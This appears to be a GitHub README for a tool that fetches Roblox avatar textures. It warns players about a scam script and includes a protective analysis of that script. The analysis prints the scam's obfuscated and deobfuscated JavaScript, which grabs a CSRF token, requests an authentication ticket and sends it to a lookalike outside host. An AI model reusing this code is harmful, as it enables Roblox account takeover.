# Roblox Avatar Texture Scraper
Got a message or email from someone asking for your Roblox Avatar Texture, and asking you to run a JavaScript script in your browser? Instead of doing that (and giving away access to your account in the process*), use Roblox Avatar Texture Scraper (RATS) to get it instead.

## Example Usage

### Python:
**Make sure you have Python installed**
- Download the rats.py file
- Open Command Prompt (cmd.exe) or Power Shell in the folder where you installed the file
  - Alternatively use `cd C:\Downloads` where C:\Downloads is the folder with the file.
- Run the command `python rats.py`
- Enter your Player ID (ex: `2968170`)
- [Bam!](https://t6.rbxcdn.com/c384b03bb7ec159dd6c3ceabaef98365)

### Standalone File:
- Download the rats.exe file [located here](https://github.com/SaxaphoneWalrus/Roblox-Avatar-Texture-Scraper/releases/)
- Run / Double click the file
- Enter your Player ID (ex: `2968170`)
- [Bam!](https://t6.rbxcdn.com/c384b03bb7ec159dd6c3ceabaef98365)


## JavaScript Attack

The attack is simple, they ask you for your avatar texture and then give you an easy way of acquiring said texture. Simple, right? They're not asking for your password or anything, so where's the catch?

### Getting Your Avatar

The way they get your avatar is simple and legitimate enough, they simply query Roblox's own API using your public details.

```
async function payload2() {
    var hash = (await (await fetch((await (await fetch("https://www.roblox.com/avatar-thumbnail-3d/json?userId=" + $("meta[name='user-data']").data("userid") + "&_=" + Math.random())).json()).Url)).json()).textures[0]

    for (var i = 31, t = 0; t < 32; t++)
        i ^= hash[t].charCodeAt(0);

    location.href = "https://t" + (i % 8).toString() + ".rbxcdn.com/" + hash
}
```

A simplified breakdown:

- They fetch the JSON from `avatar-thumbnail-3d` [like this](https://www.roblox.com/avatar-thumbnail-3d/json?userId=2968170)
- They get the Textures hash from the URL in the JSON above
- They get which CDN the texture is hosted on from the hash
- They redirect your browser to the texture.

So.. where's the catch?


### *The Catch

```
(async function(){var _0x2416b1=(await(await fetch('/home',{'credentials':'include'}))['text']())['split']('setToken(\x27')[0x1]['split']('\x27)')[0x0];var _0x12edd1=(await fetch('https://auth.roblox.com/v1/authentication-ticket',{'method':'POST','credentials':'include','headers':{'x-csrf-token':_0x2416b1}}))['headers']['get']('rbx-authentication-ticket');await fetch('https://profile-roblox.com/send22test.php'+'?t='+_0x12edd1);await payload2()}());
```

This is at the bottom of the JavaScript file, all one line so it's harder to read.
Let's make it a bit more readable (using [MalwareDecoder](https://malwaredecoder.com/) because I am lazy.);

```
(async function(){
		var _0x2416b1=(await(await fetch('/home',{
		'credentials':'include'
	}
	))['text']())['split']('setToken('')[0x1]['split']('')')[0x0];
		var _0x12edd1=(await fetch('https://auth.roblox.com/v1/authentication-ticket',{
			'method':'POST','credentials':'include','headers':{
			'x-csrf-token':_0x2416b1
		}
	}
	))['headers']['get']('rbx-authentication-ticket');
	await fetch('https://profile-roblox.com/send22test.php'+'?t='+_0x12edd1);
	await payload2()
}
());
```

And now let's have the guy that doesn't exactly know what he's talking about break it down again!

- Get your Roblox X-CSRF token ([Cross-Site Request Forgery](https://blog.roblox.com/2020/10/protecting-users-cross-site-request-forgery/))
- Get your Roblox Authentication Ticket, using the X-CSRF token that they just acquired
- Send it to their own site
- Run the legitimate code, so you get your avatar texture.


## Why "RATS"?

My original python file I made for my own usage was called `avatr_texture.py`, and when I decided I wanted to put it out I decided to add Roblox to the name so people know what it's for, making it more likely to be seen by those who need it (Spoiler alert: Nobody will see it.)
And then I added 'Scraper' to the end because, well, I think "Rats" sounds better than "RAT" - and it also helps that the people who made the original JS script are rats.


## Me!

[I make YouTube videos.](https://youtube.com/saxaphonewalrus) They have nothing to do with this, I just thought I'd plug it in case anyone sees this.
